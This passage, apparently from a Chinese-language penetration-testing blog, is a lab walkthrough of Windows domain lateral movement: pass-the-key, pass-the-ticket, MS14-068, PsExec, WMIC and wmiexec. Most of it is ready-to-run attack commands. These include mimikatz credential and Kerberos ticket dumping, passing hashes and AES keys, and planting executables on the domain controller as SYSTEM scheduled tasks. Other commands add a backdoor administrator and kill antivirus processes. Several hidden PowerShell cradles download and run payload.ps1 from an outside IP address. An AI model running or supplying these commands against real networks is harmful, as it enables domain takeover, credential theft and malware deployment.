alt="image-20230308103912088"></p><p>传递完成后会<em>弹出一个框</em>可以进行链接了,</p><p>远程链接上去，在框里上传恶意文件，写计划任务或服务等</p><pre class="line-numbers language-none"><code class="language-none">copy c:\users\mb\desktop\1.exe \\192.168.70.13\c$ #上传恶意文件schtasks /create /s 192.168.70.13 /tn test1 /sc onstart /tr c:\1.exe /ru system /f #写计划任务schtasks /run /s 192.168.70.13 /i /tn test1 #启动服务schtasks /delete /s 192.168.70.13 /i /tn test1 #删除计划任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="pass-the-key密钥传递攻击-PTK-横向攻击"><a href="#pass-the-key密钥传递攻击-PTK-横向攻击" class="headerlink" title="pass the key密钥传递攻击(PTK)横向攻击"></a>pass the key密钥传递攻击(PTK)横向攻击</h1><h2 id="PTK介绍"><a href="#PTK介绍" class="headerlink" title="PTK介绍"></a>PTK介绍</h2><p>WinXP/2003/Vista/2008，以及未打KB2871997补丁之前的Win7/2008r2/8/2012,这些环境我们都可以<br>使用NTLM哈希传递</p><p>对于8.1/2012r2，安装<em>补丁kb2871997</em>的Win 7/2008r2/8/2012,可以使用<em>AES keys</em>代替NTLM来进行验证</p><h2 id="什么是KB2871997"><a href="#什么是KB2871997" class="headerlink" title="什么是KB2871997"></a>什么是KB2871997</h2><p>KB2871997:<em>禁止本地管理员账户用于远程连接</em>，这样就无法以本地管理员用户的权限执行wmi、psexec、<br>schtasks、at和访问文件共享。</p><p>这个补丁发布后常规的Pass The Hash已经无法成功，唯独默认的<em>Administrator (SID 500)账号例外</em>，利用这<br>个账号仍可以进行Pass The Hash远程连接，即使administrator修改了名字</p><p>但是还可以通过AES密钥来替代NTLM验证进行横向的操作，其实这个补丁挺鸡肋的，不过用<em>AES密钥</em>照样也可以用NTLM,只是需要Administrator (SIDV 500)421都拿到机器了，Administrator还不容易吗?</p><p>这个补丁唯一的好处就是减少存储在内存中的凭据数据，也就是让wdigest协议认证的凭据不会存储在lsass.exe, 这样子当你dump Isass.exe的时候你就会发现，wdigest协议中的凭据你就看不到了!</p><h2 id="实验复现"><a href="#实验复现" class="headerlink" title="实验复现"></a>实验复现</h2><h3 id="实验条件"><a href="#实验条件" class="headerlink" title="实验条件"></a>实验条件</h3><table><thead><tr><th>机器名</th><th>系统</th><th>登录用户</th><th>IP</th></tr></thead><tbody><tr><td>域内主机(2012-2)</td><td>windows server 2012R2</td><td>本地管理员mb</td><td>192.168.70.14</td></tr><tr><td>域内主机(2012-1)</td><td>windows server 2012R2</td><td>本地管理员administrator</td><td>192.168.70.13</td></tr><tr><td>域控(DC)</td><td>windows server 2012R2</td><td>域管administrator</td><td>192.168.70.16</td></tr></tbody></table><h3 id="实验前提"><a href="#实验前提" class="headerlink" title="实验前提"></a>实验前提</h3><p>我们下载已经控制了2012-2主机，发现他是mb用户登录系统，通过抓取密码发现<em>域管账号存在内存中</em>,但是没有明文，PTH攻击也失效，这个时候采用PTK攻击</p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="使用钓鱼或者其他的方式进行远控"><a href="#使用钓鱼或者其他的方式进行远控" class="headerlink" title="使用钓鱼或者其他的方式进行远控"></a>使用钓鱼或者其他的方式进行远控</h4><p><img src="assets/image-20230308115256083.png" alt="image-20230308115256083"></p><h4 id="绕过uac进行提权"><a href="#绕过uac进行提权" class="headerlink" title="绕过uac进行提权"></a>绕过uac进行提权</h4><p><img src="assets/image-20230308115341039.png" alt="image-20230308115341039"></p><p><img src="assets/image-20230308115431504.png" alt="image-20230308115431504"></p><h4 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h4><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::ekeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230308115517204.png" alt="image-20230308115517204"></p><h3 id="传递key"><a href="#传递key" class="headerlink" title="传递key"></a>传递key</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::pth /user:administrator /domain:hack.com /aes256:6c3f838f27a28c20efe744208e13b9d4b8c57efeae3a5ec902564f6bfc917b33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230308124949687.png" alt="image-20230308124949687"></p><h3 id="登录到机器然后执行命令上线"><a href="#登录到机器然后执行命令上线" class="headerlink" title="登录到机器然后执行命令上线"></a>登录到机器然后执行命令上线</h3><pre class="line-numbers language-none"><code class="language-none">dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230308125022568.png" alt="image-20230308125022568"></p><h3 id="计划任务等等之类的"><a href="#计划任务等等之类的" class="headerlink" title="计划任务等等之类的"></a>计划任务等等之类的</h3><pre class="line-numbers language-none"><code class="language-none">net use \\dc.hack.comcopy C:\Users\mb\Desktop\1.exe \\dc.hack.com\C$schtasks /create /s dc.hack.com /tn test /sc onstart /tr C:\1.exe /ru system /fschtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="pass-the-ticket票据传递攻击-PTT-横向攻击"><a href="#pass-the-ticket票据传递攻击-PTT-横向攻击" class="headerlink" title="pass the ticket票据传递攻击(PTT)横向攻击"></a>pass the ticket票据传递攻击(PTT)横向攻击</h1><h2 id="票据传递介绍"><a href="#票据传递介绍" class="headerlink" title="票据传递介绍"></a>票据传递介绍</h2><p>要想使用mimikatz的<em>哈希传递</em>功能必须具有<em>本地管理员权限</em>。</p><p>mimikatz同样提供了 <em>不需要本地管理员权限</em>进行横向渗透测试的方法，例如票据传递( PassThe Ticket,PTT)</p><p><em>票据传递</em>是基于<em>kerberos认证</em>的一种攻击方式，常用来做后渗透权限维持。</p><p>黄金票据攻击利用的前提是得到了域内<em>krbtgt用户</em>的<em>NTLM哈希</em>或AES-256的值。</p><p>白银票据攻击利用的前提是得到了<em>域内服务账号</em>的<em>HTML哈希</em>或AES-256的值。</p><p>票据传递攻击一般分为两种</p><ol><li>自己制作票据</li><li>传递内存中的票据</li></ol><h2 id="实验复现-1"><a href="#实验复现-1" class="headerlink" title="实验复现"></a>实验复现</h2><h3 id="导出内存的票据"><a href="#导出内存的票据" class="headerlink" title="导出内存的票据"></a>导出内存的票据</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz "privilege::debug" "sekurlsa::tickets /export"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230308131048246.png" alt="image-20230308131048246"></p><p>**执行以上命令后,会在当前目录下出现多个服务的票据文件,例如krbtgt. cifs、 ldap等。 **</p><h3 id="清除内存中的票据"><a href="#清除内存中的票据" class="headerlink" title="清除内存中的票据"></a>清除内存中的票据</h3><pre class="line-numbers language-none"><code class="language-none">shell klist purgemimikatz kerberos::purge两个都是清除票据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230308132051424.png" alt="image-20230308132051424"></p><h3 id="将高权限的票据文件注入内存"><a href="#将高权限的票据文件注入内存" class="headerlink" title="将高权限的票据文件注入内存"></a>将高权限的票据文件注入内存</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::ptt [0;37522d1]-2-0-60a10000-Administrator@krbtgt-HACK.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="访问机器-mb用户没有过uac"><a href="#访问机器-mb用户没有过uac" class="headerlink" title="访问机器(mb用户没有过uac)"></a>访问机器(mb用户没有过uac)</h3><pre class="line-numbers language-none"><code class="language-none">dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="上线域控"><a href="#上线域控" class="headerlink" title="上线域控"></a>上线域控</h3><pre class="line-numbers language-none"><code class="language-none">net use \\dc.hack.comcopy C:\Users\mb\Desktop\wanli.exe \\dc.hack.com\C$shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr C: \wanli.exe /ru system /fshell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="PTT攻击之ms14-068传递获取域管横向"><a href="#PTT攻击之ms14-068传递获取域管横向" class="headerlink" title="PTT攻击之ms14-068传递获取域管横向"></a>PTT攻击之ms14-068传递获取域管横向</h1><h2 id="MS14-068介绍"><a href="#MS14-068介绍" class="headerlink" title="MS14-068介绍"></a>MS14-068介绍</h2><p>ms14-068漏洞主要通过<strong>伪造域管的TGT</strong>,将普通用户权限提权为域管权限，以此来控制域控。</p><p>只要服务器<strong>未打ms14-068补丁</strong>(KB3011780) ，在server 2000以上的域控服务器中，都可进行利用</p><h2 id="MS1-4-068的利用条件"><a href="#MS1-4-068的利用条件" class="headerlink" title="MS1 4-068的利用条件"></a>MS1 4-068的利用条件</h2><ul><li><strong>1、获取域普通用户的账号密码</strong></li><li><strong>2、获取域普通用户的sid</strong></li><li><strong>3、服务器末打KB3011780补丁</strong></li></ul><h2 id="MS14-068实验"><a href="#MS14-068实验" class="headerlink" title="MS14-068实验"></a>MS14-068实验</h2><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p><strong>域控: 192.1 68.70.16 windows server 2012</strong></p><p><strong>域内机器: 192.168.70.14 win10 lihua域内用户</strong></p><h3 id="MS14-068利用"><a href="#MS14-068利用" class="headerlink" title="MS14-068利用"></a>MS14-068利用</h3><h4 id="查看域用户的SID"><a href="#查看域用户的SID" class="headerlink" title="查看域用户的SID"></a>查看域用户的SID</h4><pre class="line-numbers language-none"><code class="language-none">whoami /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230313112011907.png" alt="image-20230313112011907"></p><h4 id="清除内存中的票据-1"><a href="#清除内存中的票据-1" class="headerlink" title="清除内存中的票据"></a>清除内存中的票据</h4><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="生成票据"><a href="#生成票据" class="headerlink" title="生成票据"></a>生成票据</h4><pre class="line-numbers language-none"><code class="language-none">MS14-068.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控MS14-068.exe -u lihua@hack.com -p 123456.A -s S-1-5-21-3769107300-1842393386-2897162586-1113 -d dc.hack.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230313114341774.png" alt="image-20230313114341774"></p><h4 id="导入票据"><a href="#导入票据" class="headerlink" title="导入票据"></a>导入票据</h4><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::ptc 票据名字mimikatz kerberos::ptc TGT_lihua@hack.com.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230313124319641.png" alt="image-20230313124319641"></p><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><pre class="line-numbers language-none"><code class="language-none">dir \\dc.hack.com\c$  #注意是机器名不是IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="建立网络连接"><a href="#建立网络连接" class="headerlink" title="建立网络连接"></a>建立网络连接</h4><pre class="line-numbers language-none"><code class="language-none">shell net use \\dc.hack.comcopy C:\users\lihua\Desktop\1.exe \\dc.hack.com\C$shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\wanli.exe /ru system /fshell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230313125203922.png" alt="image-20230313125203922"></p><h2 id="goldenPac-exe"><a href="#goldenPac-exe" class="headerlink" title="goldenPac.exe"></a>goldenPac.exe</h2><p>此工具是<code>impacket</code>工具包里的，它是MS14-068+ psexec的组合,因此使用起来非常放方便快捷<br><strong>用法</strong></p><pre class="line-numbers language-none"><code class="language-none">goldenPac.exe 域名/域用户名:域用户明文密码@域控完整域名goldenPac.exe hack.com/lihua:123456.A@dc.hack.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="PsExec工具远程CMD横向移动"><a href="#PsExec工具远程CMD横向移动" class="headerlink" title="PsExec工具远程CMD横向移动"></a>PsExec工具远程CMD横向移动</h1><h2 id="PsExec介绍"><a href="#PsExec介绍" class="headerlink" title="PsExec介绍"></a>PsExec介绍</h2><p>psexec是windows下非常好的- -款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对<br>方开启admin共享和ipc (该共享默认开启，依赖于445端口)。但是，假如目标主机开启了防火墙(防火墙禁止<br>445端口连接) . psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具, 所以<br>杀毒软件将其列在白名单中</p><p>下载地址<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><h2 id="PsExec使用条件"><a href="#PsExec使用条件" class="headerlink" title="PsExec使用条件"></a>PsExec使用条件</h2><p>1、具有正确的凭证(内存凭证、账号密码、账号NTLM Hash)</p><p>2、能建立IPC链接(也就是需要通过smb认证的) , 且目标机器开启了共享(默认开启的) .并且目标共享中必须有admin$共享</p><h2 id="PsExec常用参数"><a href="#PsExec常用参数" class="headerlink" title="PsExec常用参数"></a>PsExec常用参数</h2><pre class="line-numbers language-none"><code class="language-none">psexec \\ip -u administrator -p admin cmd进入半交互式shellPsExec -accepteula \\192.168.108.101 -s cmd.exe 建立交互的shellpsexec \\ip -u administrator -p admin -w c:\cmd 进入交互式shell, 且c:\是目标机器的工作目录psexec \\ip -u administrator -p admin whoami all 执行命令psexec \\ip -u administrator -p admin -d C:\beacon.exe执行文件psexec \\ip -u administrator -P admin -h -d c:\1.exe UAC的用戶权限执行文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实验复现-2"><a href="#实验复现-2" class="headerlink" title="实验复现"></a>实验复现</h2><h3 id="IPC-下的psexec"><a href="#IPC-下的psexec" class="headerlink" title="IPC$下的psexec"></a>IPC$下的psexec</h3><h4 id="建立IPC-连接"><a href="#建立IPC-连接" class="headerlink" title="建立IPC$连接"></a>建立IPC$连接</h4><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.70.16\ipc$ "admin@123" /user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230313152858276.png" alt="image-20230313152858276"></p><h4 id="返回交互的shell或者执行命令"><a href="#返回交互的shell或者执行命令" class="headerlink" title="返回交互的shell或者执行命令"></a>返回交互的shell或者执行命令</h4><pre class="line-numbers language-none"><code class="language-none">psexec.exe -accepteula \\192.168.70.16 -s cmd.exe 返回交互shell (必须是msf或者远程到桌面CS不行)psexec.exe -accepteula \\192.168.70.16 -s ipconfig 远程执行命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230313153059890.png" alt="image-20230313153059890"></p><h4 id="远程复制"><a href="#远程复制" class="headerlink" title="远程复制"></a>远程复制</h4><pre class="line-numbers language-none"><code class="language-none">copy C:\Users\mb\Desktop\1.exe \\192.168.70.16\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="远程上线"><a href="#远程上线" class="headerlink" title="远程上线"></a>远程上线</h4><pre class="line-numbers language-none"><code class="language-none">psexec.exe -accepteula \\192.168.70.16 -h -d c:\1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PTH下的psexec"><a href="#PTH下的psexec" class="headerlink" title="PTH下的psexec"></a>PTH下的psexec</h3><h4 id="找到登录的凭证"><a href="#找到登录的凭证" class="headerlink" title="找到登录的凭证"></a>找到登录的凭证</h4><p><img src="assets/image-20230402134834446.png" alt="image-20230402134834446"></p><h4 id="找到和扫描地址"><a href="#找到和扫描地址" class="headerlink" title="找到和扫描地址"></a>找到和扫描地址</h4><p><img src="assets/image-20230402134917595.png" alt="image-20230402134917595"></p><h4 id="进行psexec攻击上线"><a href="#进行psexec攻击上线" class="headerlink" title="进行psexec攻击上线"></a>进行psexec攻击上线</h4><p><img src="assets/image-20230402134945598.png" alt="image-20230402134945598"></p><h3 id="进行PTT攻击"><a href="#进行PTT攻击" class="headerlink" title="进行PTT攻击"></a>进行PTT攻击</h3><h4 id="导出内存的票据-1"><a href="#导出内存的票据-1" class="headerlink" title="导出内存的票据"></a>导出内存的票据</h4><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="清除内存中的票据-2"><a href="#清除内存中的票据-2" class="headerlink" title="清除内存中的票据"></a>清除内存中的票据</h4><pre class="line-numbers language-none"><code class="language-none">shell klist purgemimikatz kerberos::purge两个都是清除票据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="将高权限的票据文件注入内存-1"><a href="#将高权限的票据文件注入内存-1" class="headerlink" title="将高权限的票据文件注入内存"></a>将高权限的票据文件注入内存</h4><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::ptt [0;fea0c2]-2-0-40e10000-Administrator@krbtgt-HACK.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看票据"><a href="#查看票据" class="headerlink" title="查看票据"></a>查看票据</h4><pre class="line-numbers language-none"><code class="language-none">shell klistmimikatz kerberos::tgt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="远程复制-1"><a href="#远程复制-1" class="headerlink" title="远程复制"></a>远程复制</h4><pre class="line-numbers language-none"><code class="language-none">copy C:\Users\mb\Desktop\1.exe \\dc.hack.com\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="远程上线-1"><a href="#远程上线-1" class="headerlink" title="远程上线"></a>远程上线</h4><pre class="line-numbers language-none"><code class="language-none">psexec.exe \\dc.hack.com -h -d c:\1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="wmic远程执行命令横向移动"><a href="#wmic远程执行命令横向移动" class="headerlink" title="wmic远程执行命令横向移动"></a>wmic远程执行命令横向移动</h1><h2 id="什么是WMI"><a href="#什么是WMI" class="headerlink" title="什么是WMI"></a>什么是WMI</h2><p>WMI是Windows在Powershell还未发布前，微软用来管理Windows系统的重要数据库工具，WMI本身的组织<br>架构是一个数据库架构，WMI服务使用DCOM或WinRM协议,自从PsExec在内网中被严格监控后，越来越多3<br>的反病毒厂商将PsExec加入了黑名单，于是黑客们渐渐开始使用WMI进行横向移动。通过渗透测试发现，在<br>使用wmiexec进行横向移动时，windows 操作系统默认不会将WMI的操作记录在日志中。因此很多APT开<br>始使用WMI进行攻击。</p><p>WMIC扩展WMI (Windows Management Instrumentation, Windows管理工具)， 提供了从命令行接口<br>和批处理脚本执行系统管理的支持。</p><p>简单来说: wmic就是wmic.exe, 位于windows目录底下，是一个命令行程序。WMIC可以以两种模式执行:交<br>互模式(Interactive mode)和非交互模式(Non-Interactive mode), WMI就是Windows Management<br>Instrumentation (Windows 管理规范)。它是Windows中的一一个核心管理技术。</p><h2 id="WMIC常见命令"><a href="#WMIC常见命令" class="headerlink" title="WMIC常见命令"></a>WMIC常见命令</h2><p>wmic命令需要<em>本地管理员或域管理员</em>才可以进行正常使用，普通权限用户若想要使用wmi,可以修改普通用户的<br>ACL,不过修改用户的ACL也需要管理员权限，普通用户使用wmic。以下命令均在2008R2、2012R2、 2016上<br>进行测试部分命令在虚拟机中测试不行。</p><pre class="line-numbers language-none"><code class="language-none">wmic logon list brief 登录用户wmic ntdomain list brief 域控机器wmic useraccount list brief 用户列表wmic share get name,path 查看系统共享wmic service list brief more 服务列表wmic startup list full 识别开机启动的程序，包括路径wmic fsdir "c:\\test" call delete 删除C盘下的test目录wmic nteventlog get path, filename ,writeable 查看系统中开启的日志wmic nicconfig get ipaddress , macaddress 查看系统中网卡的IP地址和MAC地址wmic qfe get description, installedon 使用wmic识别安装到系统中的补丁情况wmic product get name, version 查看系统中安装的软件以及版本，2008R2 上执行后无反应。wmic useraccount where "name= '%UserName%'" call rename newUserName 更改当前用户名wmic useraccount where "name= 'Administrator'" call Rename admin 更改指定用户名wmic bios list full| findstr /i "vmware" 查看当前系统是否是VMWARE，可以按照实际情况进行筛选wmic desktop get screensaversecure, screensavertimeout 查看当前系统是否有屏保保护，延迟是多少wmic process where name= "vmtoolsd.exe" get executablepath 获取指定进程可执行文件的路径wmic environment where "name=' temp'" get UserName ，VariableValue 获取temp环境变量查询当前主机的杀毒软件wmic process where "name like '%forti%'" get namewmic process where name=" FortiTray.exe" call terminatewmic /namespace: \\root\securitycenter2 path antivirusproduct GETdisplayName , productstate , pathToSignedProductExewmic /namespace: \\root\securitycenter2 path antispywareproduct GET displayName，productState,pathToSignedProductExe &amp; wmic /namespace: \\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExewmic product where name="Office" call uninstall查看某个进程的详细信息(路径， 命令行参数等)wmic process where name= ”chrome.exe" list fullwmic process where name= "frp. exe" get executablepath, name，ProcessId 进程路径wmic process where caption="frp.exe" get caption, commandline /value更改PATH环境变量值，新增c : \whoamiwmic environment where "name= ' path' and username=' &lt;system&gt;'" set VariableValue= "%path%;c: \whoami查看某个进程的详细信息-PIDwmic process list brieftasklist /SVC| findstr frp.exewmic process where ProcessId=3604 getParentProcessId, commandline,processid, executablepath, name , CreationClassName , CreationDate终止一个进程wmic process where name ="xshell.exe" call terminatentsd -C q -p进程的PIDtaskkill -im pid获取电脑产品编号和型号信息wmic baseboard get Product ，SerialNumberwmic bios get serialnumber安装软件wmic product get name , versionwmic product list brief<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><pre class="line-numbers language-none"><code class="language-none">1.开启防火墙时，允许共享例外错误:代码= 0x800706ba说明= RPC服务器不可用。设备= Win322.组策略阻止administraotr远程访问时错误:代码= 0x80070005说明=拒绝访问。设备= Win323.IP安全策略阻止135时错误:代码= 0x800706ba说明= RPC服务器不可用。设备= Win324.禁用winmpmt服务时错误:代码= 0x80070422说明=无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。设备= Win325.拒绝wbem目录权限，无法使用wmic的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wmic调用cmd"><a href="#wmic调用cmd" class="headerlink" title="wmic调用cmd"></a>wmic调用cmd</h2><h3 id="以下命令需要管理员权限"><a href="#以下命令需要管理员权限" class="headerlink" title="以下命令需要管理员权限"></a>以下命令需要管理员权限</h3><pre class="line-numbers language-none"><code class="language-none">执行命令并且输出wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create "cmd.exe /c ipconfig &gt;c:\ip.txt"wmic /node:192.168.70.16 /user:administrator /password:admin@123 process call create "cmd.exe /c ipconfig &gt;c:\ip.txt"列出远程主机进程wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process list brief在远程系统上执行bat脚本wmic /node:IP地址 /user:本地用户管理员/域管理员/password:密码 process call create C:\programdata\test.batwmic /node:IP地址 /user:本地用户管理员/域管理员/password: 密码 process call create "cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add"执行powershell上线wmic /NODE:IP /user:本地用户管理员/域管理员 /password:密码 PROCESS call create "powershell.exe -nop -W hidden -c \"IEX ((new-object net.webclient).downloadstring('ps脚本地址'))\""wmic /NODE:192.168.70.16 /user:hack\administrator /password:admin@123 PROCESS call create "powershell.exe -nop -W hidden -c \"IEX((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))\""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用powershell-上线"><a href="#利用powershell-上线" class="headerlink" title="利用powershell.上线"></a>利用powershell.上线</h3><h4 id="1、使用cs生成powershell脚本"><a href="#1、使用cs生成powershell脚本" class="headerlink" title="1、使用cs生成powershell脚本"></a>1、使用cs生成powershell脚本</h4><p><img src="assets/image-20230402165242652.png" alt="image-20230402165242652"></p><h4 id="2、wmic进行上线-把ps1放到公网，可以使用python开启http服务提供下载"><a href="#2、wmic进行上线-把ps1放到公网，可以使用python开启http服务提供下载" class="headerlink" title="2、wmic进行上线,把ps1放到公网，可以使用python开启http服务提供下载"></a>2、wmic进行上线,把ps1放到公网，可以使用python开启http服务提供下载</h4><p><code>python-m http.server 8080</code></p><pre class="line-numbers language-wmi" data-language="wmi"><code class="language-wmi">wmic /NODE:192.168.70.16 /user:hack\administrator /password:admin@123 PROCESS call create "powershell.exe -nop -W hidden -c \"IEX((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))\""<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3、等待片刻上线"><a href="#3、等待片刻上线" class="headerlink" title="3、等待片刻上线"></a>3、等待片刻上线</h4><p><strong><img src="assets/image-20230402165431251.png" alt="image-20230402165431251"></strong></p><h2 id="Wmiexec工具"><a href="#Wmiexec工具" class="headerlink" title="Wmiexec工具"></a>Wmiexec工具</h2><p>wmiexec是-个即有全交互也有半交互的远程命令执行工具，有python版本的pe版本可运用于多种环境，包括webshell环境、rdp环境、socks环境等</p><pre class="line-numbers language-none"><code class="language-none">明文账号：wmiexec.exe 域名/用户名:密码@目标IP  #哈希传递获得shellwmiexec.exe 域名/用户名:密码@目标IP "ipconfig" #执行命令eg:wmiexec.exe hack/administrator:admin@123@192.168.70.16 "whoami"wmiexec.exe hack/administrator:admin@123@192.168.70.16 "powershell.exe -nop -W hidden -C IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))"哈希传递：wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名@目标IP #哈希传递获得shellwmiexec.exe -hashes LM Hash:NT Hash 域名/用户名@目标IP "whoami" #执行命令eg:wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 administrator@192.168.70.16 "whoami"wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 administrator@192.168.70.16 "powershell.exe -nop -W hidden -C IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用powershell上线"><a href="#利用powershell上线" class="headerlink" title="利用powershell上线"></a>利用powershell上线</h3><h4 id="1、使用账号密码登录进行powershell上线"><a href="#1、使用账号密码登录进行powershell上线" class="headerlink" title="1、使用账号密码登录进行powershell上线"></a>1、使用账号密码登录进行powershell上线</h4><pre class="line-numbers language-none"><code class="language-none">wmiexec.exe hack/administrator:admin@123@192.168.70.16 "powershell.exe -nop -W hidden -C IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2、使用hash上线"><a href="#2、使用hash上线" class="headerlink" title="2、使用hash上线"></a>2、使用hash上线</h4><pre class="line-numbers language-none"><code class="language-none">wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 administrator@192.168.70.16 "powershell.exe -nop -W hidden -C IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h2><p>wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显，获取远<br>程主机的半交互式Shell. wmiexec.vbs支持两种模式， 一种是半交互式shell模式，另一种是执行单条命令模式</p><p>wmiexec.vbs 下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p><pre class="line-numbers language-none"><code class="language-none">cscript.exe //nologo wmiexec.vbs /cmd IP 用户 密码 "命令”eg:cscript.exe //nologo wmiexec.vbs /cmd 192.168.70.16 hack\administrator admin@123 "whoami"cscript.exe //nologo wmiexec.vbs /cmd 192.168.70.16 hack\administrator admin@123 "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用powershell上线"><a href="#使用powershell上线" class="headerlink" title="使用powershell上线"></a>使用powershell上线</h3><pre class="line-numbers language-none"><code class="language-none">cscript.exe //nologo wmiexec.vbs /cmd 192.168.70.16 